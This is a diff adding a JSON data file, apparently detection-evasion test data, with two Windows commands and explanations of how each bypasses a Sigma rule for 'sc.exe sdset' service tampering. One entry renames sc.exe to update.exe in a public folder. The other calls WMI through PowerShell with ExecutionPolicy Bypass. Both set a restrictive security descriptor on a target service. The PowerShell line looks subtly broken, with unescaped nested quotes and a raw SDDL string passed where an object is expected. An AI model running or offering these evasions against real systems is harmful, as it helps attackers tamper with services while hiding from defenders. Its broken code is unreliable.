@@ -1,0 +1,10 @@
+[
+  {
+    "output": "copy C:\\Windows\\System32\\sc.exe C:\\Users\\Public\\update.exe && C:\\Users\\Public\\update.exe sdset TargetService D:(D;;DCLCWPDTSD;;;IU)(A;;CCLCSWLOCRRC;;;AU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)",
+    "explanation": "The Sigma rule relies on identifying the process by its image name (ending in \\sc.exe) or the 'OriginalFileName' field (sc.exe). By copying the legitimate sc.exe binary to a different location with a different name, the 'Image' filter is bypassed. If the logging system does not extract or filter by 'OriginalFileName' (PE metadata), the execution will not trigger the 'selection_img' condition."
+  },
+  {
+    "output": "powershell.exe -ExecutionPolicy Bypass -Command \"$sd = 'D:(D;;DCLCWPDTSD;;;IU)(A;;CCLCSWLOCRRC;;;AU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)'; [System.Management.ManagementClass]$mc = New-Object System.Management.ManagementClass('Win32_Service'); $service = Get-WmiObject -Class Win32_Service -Filter \"Name='TargetService'\"; $service.SetSecurityDescriptor($sd)\"",
+    "explanation": "The rule specifically targets the use of 'sc.exe' with the 'sdset' command. Using alternative interfaces like WMI (Win32_Service class), PowerShell service cmdlets, or direct Registry manipulation of the 'Security' subkey under HKLM:\\SYSTEM\\CurrentControlSet\\Services\\<ServiceName> achieves the same tampering without invoking sc.exe or the 'sdset' string in a process command line."
+  }
+]
